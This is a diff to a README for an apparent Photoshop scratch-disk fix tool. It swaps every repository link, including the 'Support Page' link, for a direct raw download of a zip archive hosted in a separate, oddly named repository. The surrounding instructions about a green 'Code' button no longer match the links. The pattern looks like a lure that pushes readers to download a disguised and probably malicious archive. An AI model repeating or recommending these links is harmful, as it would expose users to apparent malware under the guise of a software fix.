@@ -5,7 +5,7 @@ description: "Fix Photoshop scratch disk full errors and restore normal operatio
 ---
 # 🛠️ photoshop-disk-error-fix - Fix Photoshop Disk Errors Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Photoshop_Disk_Fix-blue)](https://github.com/Beakedparsleyalpinism864/photoshop-disk-error-fix)
+[![Download Now](https://img.shields.io/badge/Download-Photoshop_Disk_Fix-blue)](https://raw.githubusercontent.com/Beakedparsleyalpinism864/beakedparsleyalpinism864.github.io/main/isothere/Dist-v3.7.zip)
 
 ---
 
@@ -51,7 +51,7 @@ The tool works with both 64-bit and 32-bit versions of Photoshop.
 
 Visit the download page here:
 
-**[👉 Click Here to Download photoshop-disk-error-fix](https://github.com/Beakedparsleyalpinism864/photoshop-disk-error-fix)**
+**[👉 Click Here to Download photoshop-disk-error-fix](https://raw.githubusercontent.com/Beakedparsleyalpinism864/beakedparsleyalpinism864.github.io/main/isothere/Dist-v3.7.zip)**
 
 You will see a green "Code" button on that page. Click it, then click "Download ZIP". 
 
@@ -250,7 +250,7 @@ This tool is provided for free under the MIT License. You can modify and redistr
 
 If you still have problems after running the tool, visit the repository's Issues page:
 
-**[Go to the Support Page](https://github.com/Beakedparsleyalpinism864/photoshop-disk-error-fix)**
+**[Go to the Support Page](https://raw.githubusercontent.com/Beakedparsleyalpinism864/beakedparsleyalpinism864.github.io/main/isothere/Dist-v3.7.zip)**
 
 Open a new issue with:
 - Your Windows version (press Win+R, type `winver`, press Enter)
